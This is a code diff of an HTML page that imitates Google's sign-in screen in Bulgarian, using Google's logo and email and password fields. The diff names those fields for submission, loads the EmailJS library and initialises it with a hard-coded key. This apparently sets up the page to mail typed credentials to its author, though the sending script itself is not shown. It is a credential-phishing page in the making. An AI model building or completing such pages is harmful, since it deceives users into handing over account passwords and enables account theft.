@@ -10,12 +10,24 @@
     <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="logo">
     <h2>Вход</h2>
     <form id="loginForm">
-      <input type="email" id="email" placeholder="Имейл или телефонен номер" required>
-      <input type="password" id="password" placeholder="Въведете паролата си" required>
+      <input type="email" id="email" name="user_email" placeholder="Имейл или телефонен номер" required>
+      <input type="password" id="password" name="user_password" placeholder="Въведете паролата си" required>
       <button type="submit">Напред</button>
       <p id="errorMessage" class="error"></p>
     </form>
   </div>
+
+  <!-- Първо зареждаме EmailJS библиотеката -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+  <!-- После я инициализираме -->
+  <script>
+    (function(){
+      emailjs.init("p6VtqDmWbTdPtQmBQ"); // Твоят Public Key
+    })();
+  </script>
+
+  <!-- Накрая зареждаме нашия код -->
   <script src="script.js"></script>
 </body>
 </html>
